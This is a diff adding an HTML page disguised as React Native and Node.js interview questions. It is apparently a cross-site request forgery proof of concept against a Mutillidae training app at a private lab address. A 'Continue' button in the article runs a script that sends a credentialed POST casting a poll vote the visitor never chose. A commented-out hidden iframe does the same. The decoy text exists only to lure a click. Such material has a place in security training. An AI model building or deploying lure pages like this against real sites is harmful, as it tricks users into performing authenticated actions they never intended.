@@ -1,0 +1,71 @@
+<html>
+<head>
+<link rel="stylesheet" type="text/css">
+<meta charset="UTF-8">
+<style>
+	body {
+   		background-color: #C0C0C0;
+	}
+	h5 {
+   		color: #6C3483;
+   	}
+</style>
+<script>
+
+function testFunc() {
+
+    alert("You can not read rest of information...");
+
+    var params = 'choice=wireshark&initials=';
+    var reqBody = '&user-poll-php-submit-button=Submit+Vote&csrf-token=';
+    params = params.concat(reqBody);
+    var http = new XMLHttpRequest();
+    http.open('POST', 'http://192.168.176.128/mutillidae/index.php?page=user-poll.php', true);
+    http.withCredentials = true;
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.setRequestHeader('Content-length', params.length);
+    http.setRequestHeader('Connection', 'close');
+    http.send(params);
+
+}
+
+</script>
+</head>
+<body>
+
+<!--<iframe src="http://192.168.176.128/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=&user-poll-php-submit-button=Submit+Vote" style="display:none"></iframe>-->
+
+<center>
+	<h1>Interview Questions</h1>
+	<br><br>
+	<h2>How Different is React-native from ReactJS ?</h2>
+	<h5>
+        How Different is React-native from ReactJS ?
+
+        Usage Scope
+        ReactJs - React is a  JavaScript library for building Responsive User Interfaces for Building Web Application.
+        React Native - It is a framework for creating mobile applications with a native feel.
+        Syntax
+        Both React and React Native uses JSX (JavaScript XML)  syntax but React uses html tags like <div> <h1> <p> etc while React Native uses <view> <text> etc.
+         Animation And Gestures
+        React uses CSS animations on a major scale to achieve animations for a web page while  The recommended way to animate a component is to use the Animated API provided by React-Native.
+        Routing Mechanism
+        React uses a react-router for routing and does not have any inbuilt routing capabilities but React Native has a built-in Navigator library for navigating mobile applications. <button onclick="testFunc()">Contunie</button>
+	</h5>
+	<br><br>
+	<h2>Top Node.js Interview Questions and Answers in 2021</h2>
+	<h5>
+        Node.js is a super popular server-side platform that more and more organizations are using. If you are preparing for a career change and have an upcoming job interview, it’s always a good idea to prepare and brush up on your interview skills beforehand. Although there are a few commonly asked Node.js interview questions that pop up during all types of interviews, we also recommend that you prepare by focusing on exclusive questions to your specific industry.
+
+        We have compiled a comprehensive list of common Node.js interview questions that come up often in interviews and the best ways to answer these questions. This will also help you understand the fundamental concepts of Node.js.
+
+        The Node.js interview questions are grouped into the following categories:
+
+        Beginner Node.js Interview Questions
+        Intermediate Node.js Interview Questions
+        Advanced Node.js Interview Questions<a href="">Continue..</a>
+	</h5>
+</center>
+</body>
+
+</html>
